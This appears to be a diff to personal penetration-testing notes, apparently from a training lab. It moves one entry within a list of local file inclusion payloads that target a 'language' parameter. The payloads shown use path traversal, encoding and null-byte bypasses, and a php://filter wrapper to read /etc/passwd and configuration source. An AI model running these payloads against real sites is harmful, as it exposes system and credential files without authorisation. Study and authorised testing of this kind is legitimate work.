@@ -1538,7 +1538,6 @@ $ cat Logs/10.129.201.94/etc/passwd.log
 /index.php?language=/etc/passwd
 /index.php?language=../../../../etc/passwd
 /index.php?language=/../../../etc/passwd	
-/index.php?language=./languages/../../../../etc/passwd
 ```
 
 - LFI Bypasses
@@ -1549,6 +1548,7 @@ $ cat Logs/10.129.201.94/etc/passwd.log
 /index.php?language=....\/....\/....\/....\/etc/passwd
 /index.php?language=....////....////....////....////etc/passwd
 /index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+/index.php?language=./languages/../../../../etc/passwd
 /index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
 /index.php?language=../../../../etc/passwd%00
 /index.php?language=php://filter/read=convert.base64-encode/resource=config
